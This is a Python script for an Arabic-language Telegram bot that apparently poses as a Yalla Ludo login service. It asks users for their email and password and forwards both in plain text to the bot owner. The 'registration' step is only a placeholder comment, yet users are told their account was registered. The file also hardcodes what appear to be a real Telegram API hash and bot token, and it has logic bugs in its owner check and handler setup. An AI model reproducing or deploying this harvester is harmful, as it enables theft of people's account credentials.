import json, os, sys
import asyncio
from telethon import TelegramClient, events, Button
from telethon.sessions import StringSession

API_ID = 24347380 
API_HASH = "1ad5dea4dfdddfed44df611dcd0d1736"
BOT_TOKEN = "7579264023:AAEia_w_rfEiadOSBdOmH4ohT0KhnXCiExI"
OWNER_ID = "your_telegram_id"  # ضع هنا معرف التليجرام الخاص بك
DB_FILE = "users.json" 

def load_data(file_path):
    try:
        with open(file_path, "r") as f:
            return json.load(f)
    except FileNotFoundError:
        return {}

def save_data(file_path, data):
    with open(file_path, "w") as f:
        json.dump(data, f, indent=4)

users = load_data(DB_FILE)
bot = TelegramClient("bot", API_ID, API_HASH).start(bot_token=BOT_TOKEN)

@bot.on(events.NewMessage(pattern='تحديث'))
async def restart(event):
    if event.sender_id != OWNER_ID:
        return
    await event.reply("تم اعادة تشغيل البوت")
    os.execv(sys.executable, ['python3'] + sys.argv)

@bot.on(events.CallbackQuery(data=b'login'))
async def login(event):
    user_id = str(event.sender_id)
    await event.edit("**⌔︙ قم بإرسال الإيميل **")
    
    @bot.on(events.NewMessage(from_users=event.sender_id))
    async def receive_email(evt):
        if evt.sender_id != event.sender_id:
            return
        email = evt.text.strip()
        if not email:
            await evt.reply("**⌔︙ الرجاء إرسال إيميل صالح**")
            return
        await evt.reply("**⌔︙ قم بإرسال كلمة السر **")
        
        @bot.on(events.NewMessage(from_users=event.sender_id))
        async def receive_password(evt_password):
            if evt_password.sender_id != event.sender_id:
                return
            password = evt_password.text.strip()
            if not password:
                await evt_password.reply("**⌔︙ الرجاء إرسال كلمة سر صالحة**")
                return
            
            # تسجيل الحساب في يلا لودو (هنا تحتاج إلى إضافة كود API الخاص بيلا لودو)
            # ...

            # توجيه الإيميل وكلمة السر إلى مالك البوت
            await bot.send_message(OWNER_ID, f"إيميل: {email}\nكلمة السر: {password}")
            await evt_password.reply("**⌔︙ تم تسجيل الحساب بنجاح وتم إرسال التفاصيل إلى مالك البوت**")

        bot.remove_event_handler(receive_email, events.NewMessage)

@bot.on(events.NewMessage(pattern="/start"))
async def start(event):
    user_id = str(event.sender_id)
    await event.reply(
        "**⌔︙ هلا بيك، اختر من الأزرار التالية:**",
        buttons=[
            [Button.inline("تسجيل الدخول", b'login')]
        ]
    )

print("⌔︙ البوت يعمل الآن...")

bot.run_until_disconnected()